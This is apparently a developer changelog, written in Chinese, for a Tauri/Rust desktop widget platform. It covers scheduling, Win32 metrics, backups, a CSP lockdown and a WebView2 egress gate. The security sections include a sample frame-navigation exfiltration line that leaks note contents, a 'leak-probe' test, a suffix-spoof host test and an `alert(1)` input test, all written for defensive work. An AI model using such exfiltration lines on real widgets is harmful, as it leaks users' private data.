- [x] **没有桥方法的权限收口** —— `network` / `system:monitor` / `media:control` 三项一直挂在清单里，能勾、能"授权"，但桥里没有任何方法认领它们，勾完什么都不会发生。现在授权界面对它们显示成禁用态 + `soon` 标记，组件库卡片上是灰色虚线标签，属性面板底下多一行说明。**没有从 `Permission` 类型里删掉**：清单声明了它们的组件照常通过校验，静默丢弃声明比明确拒绝更糟。（`system:monitor` 已经随系统指标落地，现在只剩 `network` 和 `media:control` 还在 `soon` 里）

剩下的按依赖顺序排。括号里写的是"为什么不能提前"：

- [x] **平台统一调度器** —— 组件自己 `setInterval` 的话，一个卡片里三条心跳就是三个计时器对象，而且窗口收起来之后照跑不误。现在一个组件实例只有**一条时间轴**：`schedule.every` / `schedule.clear` 两个桥方法（不需要权限 —— 它不碰系统资源），一次只有一个 `setTimeout` 在飞（永远取最近的到期时刻），最小 250ms、最多 8 条订阅。
  - **"不可见就停摆"有两个来源**：`document.visibilityState`（浏览器说了算）和 `lattice:window-visible`（Rust 观测窗口最小化 / 收起）。只盯前者等于没停 —— 实测主窗口最小化之后，画布上组件 iframe 的 `visibilityState` 仍然是 `visible`（WebView2 只在整个 webview 被藏起来时才翻这个属性）。`visibility.rs` 盯 `WindowEvent::Resized`（最小化在 Windows 上就是 `WM_SIZE`，尺寸变 0×0）+ 在 `hide()` / `show()` 处显式补一次（这两条不动尺寸）。
  - **页面加载时还要主动拉一次**：事件是"变了才发"，页面可能在窗口已经最小化之后才加载（热更新、权限变更重载、改完 Rust 重启），那一次变化早过去了。`hookWindowVisibility` 里 `isMinimized()` 补这一刀 —— 不加的话，热更新一次就要等用户再最小化一遍才会重新停摆。
  - **回来只补一拍，不补一串**：`next` 直接推到"下一个未来时刻"。页面藏十分钟再回来补 2400 次心跳既没意义，还会把主线程堵死 —— 组件要的是"现在是什么样"，不是"这十分钟里每一拍"。
  - 桌面窗口和画布各有一条自己的时间轴（一个实例 = 一个宿主页），统一的是"这个组件里的所有定时器"，不是整个进程。
  - `tests/schedule.html` 20 条断言（夹紧、订阅上限、心跳间隔、`clear`、文档藏起来、窗口最小化、桥上参数与权限）
- [x] **系统指标数据源** —— `metrics.rs` 四路采样，全部走 Win32，不引第三方 crate：`GetSystemTimes`（CPU，**内核时间已经含 idle**，所以总量 = 内核 + 用户）、`GlobalMemoryStatusEx`（内存）、`GetDiskFreeSpaceExW`（系统盘）、`GetIfTable2`（网络，跳过回环和 `OperStatus != Up` 的接口，行数组是变长的 —— 表头声明 `[MIB_IF_ROW2; 1]`，实际要按 `count` 往后走）。
  - **速率类指标要两次采样做差**，第一次必然返回 0（没有前值就编不出速率），所以组件启动时先打一拍建基线，第一次心跳拿到的才是真数。
  - **1 秒缓存**：五个组件在同一秒里轮询只真采一次 —— 采样是系统调用，重复采只是浪费。
  - `system.metrics` 要 `system:monitor`；非 Tauri 环境报 `internal` 而不是静默返回 0（静默会让组件显示"0% CPU"这种谎话）。
  - 新官方组件 `lattice.sysmon`（240×200，CPU / 内存 / 磁盘 / 上下行），心跳挂在调度器上、自己不碰 `setInterval`。`tests/sysmon.html` 13 条断言
- [x] **组件数据落盘留一代备份** —— `write_atomic` 覆盖前把旧内容挪到 `<名>.json.bak`，只留一代。三条约束：**只在内容真的变了才留**（组件的保存可能很频繁，一样的内容没有可丢的东西，不为它多写一次盘）；**第一次写不留**（没有旧内容可备份，否则会拿空文件盖掉一个本来不存在的历史）；**备份失败不拦主写入**（用户这一次保存比备份要紧，记一行 `eprintln!` 就走）。卸载（`widget_store_clear`）连 `.bak` 一起删 —— 那是用户明确说的"不要了"，留一份旧数据只会让以后的手工恢复分不清哪份是当前。
  - 起因见坑表"便签/待办被换成出厂示例"：种子数据把用户内容盖掉之后，一点退路都没有。现在至少能捞回上一次的内容。
  - 5 条单测（首次写不产生、覆盖留下上一份、内容相同不动备份、只留一代、临时文件不残留）+ 真机验过：先 `one` 再 `two` 再 `two`，主文件 `{"probe":"two"}`、`.bak` 停在 `{"probe":"one"}`。
- [x] **关掉的组件能撤回来** —— 两颗 ✕（宿主页窗饰上的、画布卡片上的）以前都是**不可逆删除**：placement 从 `state.json` 里删掉，桌面窗口一起销毁。而那颗 ✕ 只有 22×22、还挂在会淡入的窗饰上 —— 手滑一次，用户的布局就少一块。现在删的时候 store 留一份快照（`lastClosed`，含 placement 和 `desktopRects` 里那份矩形），主窗口底部弹 8 秒的 `Removed <名字> · Undo`。
  - **矩形必须一起存**：删 placement 时 `desktopRects` 那条也删了，只塞回 placement 的话组件会掉到"画布坐标推算"的位置上，用户看到的还是"位置变了"。
  - **`lastClosed` 不进 `state.json`**（`partialize` 里没有它）：它是"这一次还能撤回"，不是用户配置 —— 重启之后还弹一条"撤销刚才的删除"只会莫名其妙。
  - `restoreLastClosed` 先查重：实例可能已经通过别的路回来了（重装、重新投放），别再添一份。
  - 顺带把 ✕ 的**手滑保护**做了：判据是窗饰当前透明度，`< 0.9` 说明它还在 100ms 的淡入里、用户几乎没看见这颗按钮，这一下不认。不用计时器 —— 计时器要靠 `mouseenter`，而指针一直停在 iframe 里时那个事件可能压根不触发，测不出来就变成误挡。
  - 真机验过：关 sysmon → placement 从 4 变 3、撤销条显示 `Removed System · Undo`；点 Undo → placement 回来、桌面窗口重新建出来（4 个窗口）、条消失；再关 clock → 1 秒时条在、10 秒时条没了而 placement 保持已删。
  - 每次关闭都会在 Rust 侧打一行 `[lattice] widget_close <label> (reason: user, trusted detail=1 pointer=mouse at 140,20)` —— 点击特征跟着 IPC 参数一起送过去，**不再**用宿主页的 `console.info`：vite dev 其实**不**转发组件窗口的 console，那一行从来没在终端里出现过（这条判断错了整整一轮）。现在参数落到 `widget_close` 里，和 reason 同一行。
  - 这一整条链是拿真点击验的：CDP 往时钟窗口的 ✕ 上派发一次 `mousePressed`/`mouseReleased` → 日志出上面那行 → 撤销条显示 `Removed Clock` → 点 `Undo` → placement 回到 4 条、桌面窗口重建到 5 个。**注意 CDP 的合成点击不会让 Chromium 更新 `:hover`**，窗饰一直是透明的，第一次验的时候被手滑保护挡住了 —— 得先用 `CSS.forcePseudoState` 把 `body` 的 `hover` 强行打开，才走得到后面的路径。
- [x] **CSP 锁定** —— `csp.rs` 一处生成策略，`protocol.rs` 只在发 HTML 文档时挂上（子资源响应上的 CSP 浏览器一律忽略，发给 `.js`/`.css` 只是白占几十字节；真正管事的是导航那一次）。`default-src 'none'`，脚本 / 样式 / 图片 / 字体 / 媒体只放行组件自己的协议源，`frame-src` / `object-src` / `base-uri` / `form-action` 全关，`script-src` 里**没有** `'unsafe-eval'`。
  - **`'self'` 在这里是废的**：宿主页用 `sandbox="allow-scripts"` 把组件装进 iframe，文档因此拿到的是**不透明源** —— `'self'` 谁也匹配不上，连组件自己的 `widget.js` / `style.css` 都会被挡。协议源必须显式写出来。
  - **协议源跟平台走**：Windows 是 `http://lattice-widget.localhost`，其它平台是 `lattice-widget://localhost`。要和 `registry.ts::widgetSchemeBase` 一字不差，否则组件被自己的 CSP 挡掉 —— 这种 bug 看起来像"组件坏了"，最难查。
  - **`connect-src` 不是 `'none'`**：组件 `fetch("./data.json")` 读自己目录是正当用法，堵死等于让"组件自带数据文件"这个玩法失效。收在协议源上**不构成外泄通道**：`lattice-widget://` 是只读文件服务，GET 只回这个组件自己的文件，没有日志、没有 query 语义、也没有写入面。
  - **只锁用户组件**：内置组件走前端资源管线、跟着二进制一起发，拿不到这条头（也不需要）。这是剩下**唯一**的一处"同一份代码、两种行为"—— 错误上报那条已经补平了（见"内置组件也上报错误"）。
  - 3 条单测（每条出网通道都关着、组件自己的资源仍然放行、协议源与映射一致）+ 真机探针：沙箱 iframe 里 `{"scriptRan":true,"cssLoaded":"rgb(34, 34, 34)","fetch":"blocked: TypeError","image":"blocked","selfFetch":"ok"}`，响应头确实带上了整套策略；404 兜底页在同一套策略下正常渲染（说明页也是组件协议发的 HTML，一样带上）。
  - **做完不等于堵死了**：CSP 关掉的是 `fetch` / 图片 / 表单 / 套框这几条，**"把自己这个 frame 导航走"它管不了**（没有 `navigate-to` 这个指令，`frame-src` 管的是嵌别人）。`location.href = "https://…/?d=" + 便签` 依然是一次出网。所以下面单列了一条"出网闸门"，在 WebView2 层拦帧导航 —— 那才是硬闸。
- [x] **出网闸门** —— `egress.rs`，每个组件窗口建完立刻挂 `FrameNavigationStarting` + `NavigationStarting`，在导航**发生前**取消掉。白名单只有四类：宿主页的源、组件协议的源、`about:` / `data:` / `blob:`。
  - **宿主源不能从窗口现取**。第一版写成 `window.url()` 算 origin，结果 `build()` 返回时窗口还没开始导航，URL 是 `about:blank` → 取不到 origin → 四条 `egress gate skipped … no origin`，闸**根本没挂上**。改成从配置算：开发期用 `dev_url`（`http://127.0.0.1:1420`），打包后是 tauri 的资源协议（三种写法都留着，多一条前缀的代价可以忽略，漏一条就是全量白屏）。
  - **`FrameNavigationStarting` 是 wry 不暴露的事件**，只能自己拿 `ICoreWebView2` 挂（`with_webview` → `controller.CoreWebView2()`）。所以 `Cargo.toml` 多了一个 `webview2-com = "0.39"` —— 版本必须和 tauri/wry 依赖的那份一致（`Cargo.lock` 里是 0.39.1），差一个次版本就会变成两个不兼容的 crate，报错信息完全指不到这里。
  - **前缀比较要防后缀骗**：`http://localhost:1420/` 不能放行 `http://localhost:1420.evil.com/` —— 端口后面是 `.` 不是 `/`，对不上。单测钉住了这条，也钉住了 `file://` 和 `javascript:`。
  - 拦下来一定留一行 `[lattice] egress blocked (<label>, frame): <url>` —— 组件"突然不联网了"和"本来就该拦"从外面看一模一样。放行的默认不打日志（重载一次来一条，刷屏），要看就设 `LATTICE_EGRESS_TRACE=1`。
  - 真机验过：在组件 iframe **内部**执行 `location.href = "https://example.com/?d=leak-probe"` → 日志出现 `egress blocked (widget-lattice-clock-4e78858c, frame)`，iframe 的 `location.href` 和正文一字未变（21:38 / Oct 23, Fri 还是那两行）。反向也验了：给 `iframe.src` 加时间戳重新导航（就是窗饰那颗 Reload 干的事）照常放行，没有误伤。
  - **挂闸的时机**（拿 `LATTICE_EGRESS_TRACE=1` 量的）：四个窗口的 `frame` 导航 4/4 都被闸看到了；`top` 导航 3/4 —— 有一个窗口的首次顶层导航比闸快了一线。这条不构成缺口：组件的顶层导航本来就该是宿主页，而组件在 iframe 里、沙箱没给 `allow-top-navigation`，它动不了顶层。真正要管的帧导航是稳的。
- [x] **每实例配置** —— 组件要"可配置"的地方，以前只能自己画设置 UI 再存进 `storage`。两个官方组件都这么干过：时钟在卡片上放一颗 `24-hour` 按钮，倒计时放了一个原生 `<input type="date">`（还得自己按底板亮度猜 `color-scheme`，否则深色卡片上日历图标是黑的）。两个毛病其实是同一个：卡片只有 240×140，塞不下；而 `storage` 是按 `widgetId` 的，桌面上两个时钟会共享同一份偏好。
  - 现在清单声明 `config`（`toggle` / `number` / `text` / `select` / `date` 五类字段，最多 12 项），属性面板按 schema 渲染表单，值按 **`instanceId`** 存进 `state.json` 的 `configs`。组件用 `config.get` 读一份**已经合并过出厂值**的完整对象，配置变化时宿主推 `config-changed` —— **不重载**组件，重载会冲掉没落盘的草稿。
  - 合并规则只有一份（`runtime/config.ts::resolveConfig`）：缺的键补 `default`、非法值（类型错 / 越界 / 选项不存在 / 日期不存在）退回 `default`、未知键不外泄。Rust 只透传，所以画布和桌面看到的是同一份结果。
  - 写坏的字段**单独丢弃**，不让整包加载失败 —— 跟 `icon` 同一条原则：锦上添花的东西不该拖垮组件。
  - 顺手把两个官方组件迁到调度器上：`lattice.clock` 与 `lattice.countdown` 原来还在 `setInterval`（不变量 10 的漏网），现在都走 `schedule.every`。另外 12 小时制 + 秒数在 240 宽下会折行、把日期挤出卡片，加了一档 `is-long` 把字号退到 33px。
  - `tests/config.html` 24 条断言（字段丢弃、上限、`min > max` 交换、`select` 默认回退、日期合法性、未知键、NaN）+ 浏览器态端到端验过：拨 `Show seconds`，画布 iframe 当场从 `23:21` 变 `23:21:14`；倒计时改日期 `69 天 → 62 天`、改说明文字当场生效，值都落在 `configs["lattice.countdown#…"]` 上。
- [x] **内置组件也上报错误** —— 错误上报一直是"往组件文档里注一段脚本"，而注入只写在 `protocol.rs` 里，那条路只发 `lattice-widget://`（用户装的组件）。内置组件的文件走应用自己的源 —— dev 是 vite、打包后是 tauri 资源协议 —— 协议层压根碰不到，所以**官方组件抛错既不弹卡也不出兜底页**，只能靠自己的测试兜着。这是个"越常用越吃亏"的缺口：五个官方组件恰好是所有人最先跑的东西。
  - **上报脚本收成一份源码**：`src/runtime/widget-reporter.js`。Rust 侧 `diagnostics.rs` 用 `include_str!` 把它编进二进制，前端侧由 `scripts/widget-diagnostics-plugin.mjs` 注入 —— 两边读同一个文件。不这么收的话，两处各写一份，改一次漏一次，最后"官方组件的错误卡长得跟别人的不一样"。
  - **前端侧要覆盖 dev 和 build 两条路**，缺一条就等于没做：dev 下 `public/` 是 vite 直接吐的，得用 `configureServer` 装中间件现读现注；`build` 下 `public/` 被原样拷进 `dist/`，得在 `closeBundle` 里回写（必须排在这份拷贝之后，早一拍就是注了个寂寞）。
  - **注入规则照抄 Rust 那套**，包括那个容易被忽略的细节：只认 `<!doctype` 前面**只有空白**（BOM 也算），`<head` 后面不能是字母（否则 `<header>` 会被当成 `<head>`）。`scripts/widget-diagnostics.test.mjs` 用和 Rust 单测同一批 fixture 钉住这些 —— `npm run test:injection`，9 条，不依赖 dev server。
  - **压行必须字节一致**：两边都是"按行 trim、空格连接、整体再 trim"。差一个空格不至于出错，但"行数变了"会，而行数正是 `event.lineno` 的坐标系。
  - 验过：dev 下 `curl` 内置组件的 HTML，标记恰好一个（中间件幂等，没和 vite 的 `public/` 服务叠加成两份），`manifest.json` 一个字没动（`.html` 守卫）；`npm run build` 打出 `已注入 5 份内置组件文档`，5 份 `dist/widgets/*/index.html` 的**行数和源文件完全相等**；画布端到端 —— 在 `lattice.clock` 的 iframe 里 `setTimeout(() => { throw … })`，错误条当场出现 `Script error: boom-from-bundled-widget`，再塞一张不存在的图片，条上多出一个 `+1`（资源失败走 `capture`，和脚本错误是两条路径）。
  - **兜底页没有跟着补**，这是故意的：内置组件的文件跟着应用一起打包，缺文件在构建时就暴露了，兜底页那条路上只有错误卡。真正需要兜底的是"用户往目录里拷错了一个包"这种场景，那本来就只在协议层。
  - 桌面窗口那一路也验了，但**没启动 Tauri**：宿主页 `widget-host.html` 的启动链只有一个入口依赖 Rust（`invoke("widget_host_config")`），用 CDP 的 `Page.addScriptToEvaluateOnNewDocument` 在页面脚本之前塞一个假的 `__TAURI_INTERNALS__`，把这条 IPC 换成固定配置，页面就在浏览器里跑起来了 —— 验到的仍是真代码（`isWidgetErrorReport` → `paintWidgetError` → `.lw-error`），只有窗口管理那部分空转。结果：组件 iframe 里抛错，贴底的大卡出现 `Script error / boom-in-desktop-window / index.html:1:26 / Stack trace / Reload`，时钟照常在卡片上方走。这招也能用来调宿主页的样式，不必为了看一眼卡片去重启应用。
- [x] **组件库能搜** —— 库只有"已安装 / 可安装"两段，装到十几个包之后就只能靠眼睛扫。现在标题下面常驻一格搜索框，按名字、id、描述、作者、**权限名**过滤。
  - **权限名也算命中是有意的**："哪个组件能读系统指标""哪些要联网"是真实问题，而权限恰好就印在卡片上，搜不到反而奇怪。
  - **多词是 AND**（`clock 24` 只留时钟），**不做模糊匹配** —— 拼错一个字母就该是"没有"，把一堆不相干的包倒出来比搜不到更烦人。
  - 过滤只影响视图：两段仍然分开，计数变成 `命中/总数`（`Installed 2/4`），全空时给一张说明卡 + `Clear search`。常驻而不是"点放大镜展开"：库会变长，搜索是常驻入口，藏起来只会让人找不到；展开/收起还会让列表跳一下。
  - 判定逻辑抽在 `runtime/library-search.ts`（纯函数），`tests/library-search.html` 18 条断言钉着切词、大小写、空白归一、多词 AND、权限名、不做模糊这几条边界 —— 别在组件里再写一遍，复制的后果是"测试过了，界面上还是不对"。
  - `Esc` 在输入框里：有内容先清空，没内容才失焦；而且要 `stopPropagation` —— 设置菜单在 window 上听 `Esc`，不拦会连带把它关掉。
- [x] **组件库三段可折叠 + 安装动作收拢** —— 7 个已装 + 8 个目录条目摊开是 3500px 的面板，一屏只放得下两张卡；而其中真正要动手的常常只有一两张。现在 `LibSection` 让三段各自开合，默认只摊开"已安装"，`Available` 和目录两段收着，标题行上带着数量。
  - **收起来不等于藏起来**：搜索时 `forceOpen` 强制展开。搜到了却看不见，比搜不到更像功能坏了。
  - **动作不放在标题的点击区里**：点标题只管开合。`Install all` / 刷新目录这些挂在标题行右侧单独一颗 —— 想展开结果装了一堆东西，这种误触的代价比多一颗按钮大。
  - **目录段内部再分两堆**：`NEEDS_ACTION`（`install` / `update` / `untrusted` / `blocked`）排前面，其余收进 `Nothing to install`。`blocked` / `untrusted` 必须留在外面 —— 它们的卡片上有"解除拉黑""信任新钥匙"两颗按钮，收进去就等于藏了按钮。那一堆叫"Nothing to install"而不是"Up to date"：里面有 `unsigned`（没签名，装不了）和 `older`（目录比本地旧），说"最新"是假的。
  - **批量安装只覆盖 `install` 那几支**，不碰 `update`：更新可能多要权限，批量更新等于把"逐条确认"这道闸绕过去，而那正是权限变更提示存在的理由。
  - **`planInstall` 只在段里算一次**，结果传给卡片。算两遍的后果是"标题说 2 条能装、展开只有 1 张卡"—— 两处入参一旦有出入，界面上就会出现自相矛盾的数字。
  - **同一件东西不能在一屏里出现两次**：已安装、且目录里没有更高版本的条目，目录段一张卡都不出，只在统计行里交代一句（`Already installed — 6 up to date.`）。以前没这条，8 个已装组件铺出 14 张卡 —— 而 `Installed` 里那张已经把版本、权限、评分、卸载全写着了。唯一的例外是"已装 + 真有新版"：目录段那张是更新卡（`Update to 1.1.0`），不是同一句话重复。
  - **判断"有没有新版"要用另一份 plan**：`planInstall` 把换钥匙排在版本比较**前面**，一条"换了人且真有新版"的条目返回的是 `untrusted`。只看 `plan.kind` 做去重，会把新版本一起吞掉 —— 所以另算一份 `versionPlan`（去掉钉住的钥匙和拉黑名单），只拿它判断版本。
  - **两类数字不能相加**：统计行里"6 up to date"和"1 with a changed publisher key"是两个维度，同一条会同时进两个桶。写成 `6 up to date, 1 with a changed key` 会让人以为一共 7 条，所以钥匙那句另起一句、用 `1 of them`。
- [x] **组件的"怎么用"写进清单** —— 每个组件都有自己那点特殊功能（待办的优先级圆点怎么轮、专注计时器为什么关盖不丢时间、天气断网了为什么还显示数字），而属性面板里的 `help` 只能说明**一个配置项**。现在清单多了 `help`（分节正文）和 `changelog`（面向用户的变更记录），两个入口共用一份内容：属性面板里一段可折叠的 `How to use · N`，组件库卡片右上角一颗 `?`（没写说明的组件不画这颗按钮）。
  - **放清单不放 Markdown**：组件是纯静态目录，平台没有 Markdown 渲染器、也不允许运行时依赖。写进清单就跟着包走（同目录、同提交、同签名），离线能看、第三方组件也能用，还能被单测真的读出来对账。另一个副作用是它天然是**作者的义务**：签名过的包里的说明，不会像仓库里的 README 那样漂移。
  - **坏条目逐条丢**：一节没标题、一条是空串、版本号不合法 —— 丢那一条，包照常加载。和 `config` / `icon` 同一条规矩，说明不该有"让组件打不开"的权力。
  - **上限是真截断**：6 节 × 6 条 × 160 字、变更 12 条 × 8 项。320px 面板里读得完才是说明，读不完是文档。
  - **`changelog` 是给用户的，本文件是给开发者的**：写"拖动排序"、"不再丢时间"，不写"把 advance() 重构成纯函数"。顺手补上了 `CataloguePackage.notes` 那个"解析了很久但从没显示过"的字段位置。
  - **对账比断言重要**：`tests/help.html` 24 条里，前一半是三个纯函数，后一半把 `public/widgets` 下每个清单**真的读出来**查三件事 —— 没有说明的组件必须正好等于待补名单（只减不增，现在是空表）；写了说明的组件 changelog 必须有当前版本那一条；每个没有自带 `help` 的 `config` 字段都必须在正文里被提到。纯函数全绿而八个组件一个说明都没有，也是白搭。
- [x] **对齐参考线** —— 画布最缺的手感：拖到和邻居齐了，没有任何反馈，只能靠眼睛估。现在拖动时算一次对齐（`runtime/align-guides.ts`，纯函数），吸附到邻居的左/中/右、上/中/下，命中就画一段虚线（`tests/align-guides.html` 38 条 + 探针里 9 条走真指针事件）。
  - **它是另一条轴，不是网格的一部分**：网格是"量化到 8px"（看起来整齐），参考线是"拉到别人那条边上"（和那个对齐）。顺序必须是**先网格、后对齐** —— 反过来，网格会把刚吸附好的位置再推 3px 走。
  - **每条轴只留一条获胜的线**：三个等宽组件左对齐时，会有三条线同时命中（左、中、右全重合）。全画出来是三条几乎重叠的线，看着像界面卡死了。所以每条轴只挑"最近的那条"，其余丢掉。
  - **画布边界也是候选**：只跟邻居对齐的话，"把它摆到画布中间"——最常见的动作——反而没有线。补上 0 / 中线 / 满宽三条，四个方向都齐了。
  - **线画多长是第二个问题，不能顺手用"整条画布"答案**：`computeAlign` 只回答"吸到哪条线上"，`guideLines` 再回答"这段从哪儿画到哪儿" —— 以获胜线的坐标为轴、以被拖的那张卡为中心、两端各伸出「半个卡 + 48px」（总长正好是"卡 + 48px"的两倍；只比卡长一点点时，线像卡片自己的描边），再夹进容器。满屏一条竖线在桌面上尤其糟：它横穿整个屏幕，用户看不出究竟哪两张卡片对齐了；而且"局部"这条规则只有一份实现（`guideLines`），画布和桌面拖拽都调它。
  - **线不进 store**：它每一帧都在变。放进 zustand 的 `persist` 里，一次拖动能写几百遍 `state.json`，而且它根本不是用户的布局。
  - **`setPointerCapture` 要包 try/catch**：合成指针事件（自检页、探针）没有真实 pointer，不包就直接抛，整条拖拽链路断在第一步。
  - 探针还揪出一个自己写的 bug：画布尺寸取了"父节点的父节点"，而拖拽把手在标题栏里，量出来的是卡片自己的 240×140 —— "吸到画布中线"永远不触发。改成 `closest(".lattice-canvas")`。
- [x] **桌面上的对齐参考线（和画布同一套）+ 线改成"中间实线、两头虚线"** —— 之前参考线只在设计态存在：组件投到桌面之后，拖动窗口没有任何吸附反馈，"和旁边那张对齐"只能靠眼睛估，而桌面恰恰是最需要它的地方（那里没有网格、卡片还常常挨着摆）。现在桌面拖动走**同一份** `computeAlign`，命中就把线画到屏幕上。
  - **算法只有一份**：邻居矩形与工作区由 `guide_targets` 从 Rust 取（`guides.rs`），坐标交给前端的 `computeAlign` 算，再把"线在哪"交回 Rust 画。桌面要是另写一套"差不多的"吸附，两条路的手感迟早会分叉 —— 而用户会以为是同一个功能坏了。
  - **顺序照抄画布：先夹紧屏幕、再吸附邻居**。反过来的话夹紧会把吸附结果推走几像素，用户看到的是"明明对上了，松手却差一点"。
  - **坐标全是物理像素，阈值才乘 DPI**：桌面的位置/尺寸本来就是物理像素（PerMonitorV2），而 8px 的吸附阈值是 CSS 像素的手感，所以传 `8 × scaleFactor`。混着用的话在 150% 的屏上吸附距离只剩 5px。
  - **邻居只在拖动开始时取一次**：拖动期间只有被拖的那扇窗口在动；换屏（缩放变了）时补取一次，因为那时 Windows 会把窗口按 `WM_DPICHANGED` 重摆。`guide_targets` 必须是 `async` —— 同步命令跑在主线程，而 `outer_position()` 要把活儿投递回主线程再等结果，和 `sync_widget_windows` 那条死锁是同一回事。
  - **线不是透明 WebView2 画的**：参考线需要一个叠层窗口，而逐像素透明的 WebView2 在软件渲染的机器上直接建不出来（`0x8007139F`，见 `desktop.rs`）。现在用两个 `WS_EX_LAYERED | WS_EX_TRANSPARENT` 的 **1px 窗口**（一条竖的一条横的），`UpdateLayeredWindow` 逐像素给 alpha。失败的症状最多是"没有线"，而不是"屏幕上一块黑"。
  - **线是局部的短段，窗口也就那么大**：线不贯穿屏幕 —— 它从获胜的那个候选（邻居的边/中线，或容器边界）出发，以被拖的那张卡为中心、两端各伸出「半个卡 + 48px」（总长 = 2 ×（卡 + 48px），比卡片长出一倍才像"轨道"而不是描边）、夹在容器里，画出来是"贴着两张卡片那一段"。所以叠层窗口每帧改的不只是位置，还有**尺寸**（`UpdateLayeredWindow` 一次同时给目的地和大小），竖线是 `1 × len`、横线是 `len × 1`。段长规则只有一处：`align-guides.ts::guideLines`，画布和桌面都调它 —— 两边各写一套的话，同一对卡片在桌面和画布上会显示成两条长短不一的线。
  - **位图建一次，每帧只改窗口**：全屏那张位图在 3456×1080 上是 15MB，每帧交一次受不了；两条 1px 的按屏幕最大边长建（1080×4 和 3456×4 字节），只有屏幕尺寸/颜色变了才重画。拖动时只 `UpdateLayeredWindow` 换位置 + 尺寸，`len` 还要夹到位图那一维以内 —— 越界读 DIB 不是"画歪"，是访问冲突。
  - **窗口归一个专用线程所有**：跨线程 `SetWindowPos` / `UpdateLayeredWindow` 会等窗口线程处理，而窗口线程不泵消息就互相等死。外面只往通道里丢一条消息；空闲时阻塞在 `recv()` 上，不轮询 —— 线只在拖动那几百毫秒存在。
  - **4 秒兜底 + 1 秒心跳**：正常收线靠松手那一刻的 `Hide`；宿主页崩了、窗口被关掉时没人发它，一条留在屏幕上的线没有任何办法能关掉，所以叠层线程 4 秒没收到坐标就自己收。反过来"指针停住看对齐"时不会再有 `pointermove`，于是前端拖动期间每秒补一发心跳。
  - **线的形状两边必须是同一套数，而且全是虚线**：4px 亮 / 4px 空，62% 亮度，没有中段实线、没有端头淡入 —— 画布在 `styles.css` 的 `.lattice-guide`（一个 `repeating-linear-gradient` + `currentColor`，位置和长度走内联 `style`），桌面在 `guide_policy.rs::line_alpha` 里。`guide_policy.rs` 5 条 `rustc --test` 钉着像素规则（确实是虚线、alpha 只有两档、相位从段首重新起算、亮度对得上画布、颜色解析）。
  - **真机验过画线那一层**：`examples/guide_probe.rs` 在真桌面上亮两段线（竖 300px / 横 100px，故意都不满屏），自己 `BitBlt` 截两张图逐像素比。实测（连续 4 次 PASS）：竖线段长 300 行里 152 行变了、明暗切换 75 次（8px 一个节拍，理论 ~75），**段外一个像素都没变**；横线段 100 个像素里 53 个亮、切换 27 次（理论 ~25）；左右相邻列差值只有抗锯齿那 2 行；`hide()` 之后残留 0 行。**没验的**：整条拖动链路（真指针拖真窗口 + 吸附 + 出线）要起 `tauri:dev` 才走得到，这次只到 `cargo check` 和上面这层像素探针；画布那半用无头 Chrome 截了图逐像素量（竖段 y 100–287、96/188 亮、段外 0，节奏正好 `on=4 off=4`）。
- [x] **计算器 / 单位换算 / 秒表（组件 8 → 11）** —— 三个"天天用得上、但一直没有"的组件。三个都按同一套要求做：纯静态目录、零依赖、逻辑挂在 `window.__lattice*` 上给自检页调真身（`tests/calculator.html` 43 条、`tests/convert.html` 53 条、`tests/stopwatch.html` 58 条）。
  - **计算器不用 `eval`**：输入框是别人可以往里粘东西的地方。自己写词法 + 调度场算法，只认数字、`+ - * / % ^` 和括号，代价 40 行，换来"输入不是代码入口"。自检页里有一条 `evaluate("alert(1)")` 必须是 `Unexpected character: a`。
  - **`%` 是取模不是百分号**：`17%5 === 2`。表达式求值里一个孤零零的 `50%` 没有"基数"，硬做成百分号只会算出一个没人预期的数。
  - **一元负号比乘方松**：`-3^2 === -9`（先 3^2 再取负），和数学课本一致；写成和 `^` 同级就会得到 `9`。
  - **数字按 12 位有效数字收尾**：不然 `0.1 + 0.2` 显示 `0.30000000000000004`。
  - **Base64 走 UTF-8**：`btoa("中文")` 直接抛。`TextEncoder` → 二进制串 → `btoa`，反方向 `atob` → 字节 → `TextDecoder`。**MD5 只能手写**（WebCrypto 没有），向量拿 Node 的 `crypto` 生成，含 55/56/64 字节这三个填充边界。
  - **换算表用仿射处理温度**：长度是 `值 × 系数`，温度不是（0°C ≠ 0°F ≠ 0K）。硬塞进系数表会出现"0°C 换出来 32°F，换回去 0.000…1°C"，而温度恰恰是这两处都必须精确。自检页除了对答案，还把**整张表**过一遍：单位不重复、系数和仿射函数有且只有一个、基准单位在表里，再对每个分类做**全排列往返**。
  - **换算两个输入框都活着**：只有上面能输入的写法，在"我知道 100 华氏"的时候会逼用户先在心里把方向反过来。
  - **秒表存的是"按下去的那一刻"，不是"已经过了多久"**：存时长的话，卡片一关就没人给它加时间，重开读到的是关掉那一瞬的读数 —— 一个撒谎的秒表。
  - **所以它没有心跳**：跑着时用 `requestAnimationFrame` 刷显示，卡片藏起来时浏览器自己会停，回来按时间戳重算一次就对了。平台的心跳最小间隔是 250ms，拿它刷百分秒会每帧跳 25 个数，看起来像卡了。
  - **"有没有进度"看已记下的东西，不看 `elapsed > 0`**：按下 Start 又在同一毫秒按 Pause，读数是 0，按钮就显示成 Start —— 明明刚跑过、可能还记了圈。自检页正好撞上这一毫秒才露出来。
  - 三个组件都改成**先按默认值画第一帧，再等桥回来接存档**：等桥的话宿主慢一点卡片就是一块空白（`config.get` + `storage.get` 各 3s 超时，最坏 6 秒）。存档迟到时用一个 `touched` 闸门挡住，绝不覆盖用户已经做的选择。
- [x] **日历** —— 月视图 + 一天的事件，条目按 `YYYY-MM-DD` 存成一张表（`tests/calendar.html` 91 条）。ICS 订阅留给下一版：它要 `network` 权限和一条白名单，不该把"能记事了"这件事一起拖住。
  - **永远画 42 格（6 周）**：有的月只占 5 行，按实际行数画的话翻月时卡片里的内容会跳一下 —— 桌面组件钉在固定尺寸里，跳的是里面那层，看起来像重新加载。
  - **日期键不能用 `toISOString`**：那是 UTC，UTC+8 的晚上 11 点会变成前一天。日历整体错一天，而且只在晚上错，最难查。自检页有一条专门钉这个。
  - **邻月的日子点了要跳月**：点不动的话用户得先翻月再找那天；点得动却留在本月的话，上面写着 October、下面列着 11 月 3 号的事件，看着像记错了月。
  - **一行的解析规则**：行首是时间就当时间（`9:30 Standup`，全角冒号也认），其余是标题。比"两个输入框"省一半地方，也比"必须先点开编辑"快一步 —— 日历上绝大多数条目就是"几点干什么"。
  - **存档逐格筛，不整份退回**：坏日期、坏数组只丢那一格，坏条目单独丢。整份退回空白等于把用户的日历清空。
